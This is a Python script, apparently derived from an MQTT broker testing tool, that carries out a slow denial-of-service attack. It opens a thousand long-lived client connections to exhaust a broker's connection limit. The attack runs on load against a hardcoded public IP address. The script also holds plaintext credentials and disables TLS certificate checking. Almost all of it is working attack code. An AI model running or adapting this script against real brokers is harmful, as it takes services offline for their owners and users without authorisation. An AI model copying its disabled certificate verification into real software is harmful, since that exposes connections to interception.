import ssl, time
import paho.mqtt.client as mqtt
from paho.mqtt.packettypes import PacketTypes
from paho.mqtt.properties import Properties
from statistics import mean

import ctypes
libgcc_s = ctypes.CDLL('libgcc_s.so.1')

username  = "mqttbroker"
password = "test123"
connected = 0

######################################################################################################################################################
# MQTT5 - enforces the persistent session
def gen_connect_properties():
    connect_properties = Properties(PacketTypes.CONNECT)
    connect_properties.SessionExpiryInterval = 86400 #0x11 - 1 day
    return connect_properties
   
###################################################################################################################################################### 
def on_connect_3(client, userdata, flags, rc):
    '''print(f"\n\n{client._client_id.decode()} connection. Result: {mqtt.connack_string(rc)} Code: {rc}", flush=True)
    if (userdata):
        print("- Userdata "+ str(userdata), flush=True)
    if (flags): #Reveals if session is already present
        print("- Flags "+ str(flags), flush=True)'''
    client.on_connect_received = True
    print(rc)
    global connected
    if (rc == 0):
        connected +=1

def on_connect_5(client, userdata, flags, reasonCode, properties):
    '''if (properties):
        print(f"{client._client_id.decode()} properties {properties}", flush=True)'''
    on_connect_3(client, userdata, flags, reasonCode)

def on_subscribe_3(client, userdata, mid, granted_qos):
    '''print(f"\n\n{client._client_id.decode()} subscribed. Message ID: {mid}", flush=True)
    for q in granted_qos:
        print("-Granted QoS: " + str(q), flush=True)
    if (userdata):
        print("-Userdata: "+ str(userdata), flush=True)'''
    client.on_subscribe_received = True
    
def on_subscribe_5(client, userdata, mid, reasonCodes, properties):
    '''if (properties):
        print(f"{client._client_id.decode()} properties {properties}", flush=True)'''
    on_subscribe_3(client, userdata, mid, reasonCodes)

######################################################################################################################################################
def set_callbacks_and_parameters(client, cert_key_paths):
    #Set username, password, and eventually the certificate and keys (only the clientID must be unique)
    
    client.username_pw_set(username, password)
    
    if(cert_key_paths[0]!=None):
        client.tls_set(cert_key_paths[0], cert_key_paths[1], cert_key_paths[2], ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
        client.tls_insecure_set(True) #allow to test scenarios with self-signed certificates

    #Set the rest of methods/properties shared between the publisher and subscriber
    if(client._protocol == 5):
        client.on_connect = on_connect_5
        client.on_subscribe = on_subscribe_5
    else:
        client.on_connect = on_connect_3
        client.on_subscribe = on_subscribe_3
        
######################################################################################################################################################
def init_client(host, version, port, keepalive, cID, clean, cert_key_paths):
    if version == 5:
        client = mqtt.Client(protocol=mqtt.MQTTv5)
        
        #ClientID, name of the test to perform, credentials and certificates
        set_callbacks_and_parameters(client, cert_key_paths)
        client.connect_async(host, port, keepalive, clean_start = clean, properties=gen_connect_properties())

    else:
        client = mqtt.Client(clean_session=clean, protocol=mqtt.MQTTv311)
        
        set_callbacks_and_parameters(client, cert_key_paths)
        client.connect_async(host, port, keepalive)
        
    client.loop_start()
    return client

######################################################################################################################################################
def slow_dos(host, version, port, cert_key_paths, max_connections, wait_time):
    global slow_connection_difference
    global connected # reset the connected counter
    connected = 0
    for x in range(max_connections):
        init_client(host, version, port, wait_time, "Client_slow_"+str(x), True, cert_key_paths)
        #time.sleep(.1) #Avoids socket error with many connections (e.g., over 8k)


    #Wait for all clients connections or X seconds timeout
    try:
        print(str(wait_time//60) +" minutes timeout for slow DoS (press ctrl+c once to skip):")
        for x in range (wait_time):
            if(max_connections-connected == 0):
                print("All "+str(max_connections)+" connections succeeded")
                break;
            else:
                if (x % 60 == 0):
                    print(str((wait_time-x)//60) + " minutes remaining")
                time.sleep(1)
    except KeyboardInterrupt:
        pass

    #Disconnect all clients #Commented out to save time (not really necessary)
    #for client in mqtt_clients:
    #    client.loop_stop()
    #    client.disconnect()

    slow_connection_difference = max_connections-connected
    print(connected)     
    #If not all clients managed to connect DoS is succesfull
    if (connected >= 0 and slow_connection_difference != 0):
        print("Slow DoS succesfull, max connections allowed: "+ str(connected))
        return True
    else:
        return False
        

def slow_dos_attack():
    host = "34.125.53.182"
    version = 3
    port = 1883
    cert_key_paths = [None]
    # topic = "uEWApy/VTqlbX6/P24p7mYqpz/0tW0j/GocMzYB"
    max_connections = 1000
    wait_time = 600
    slow_dos(host,version,port,cert_key_paths,max_connections,wait_time)

slow_dos_attack()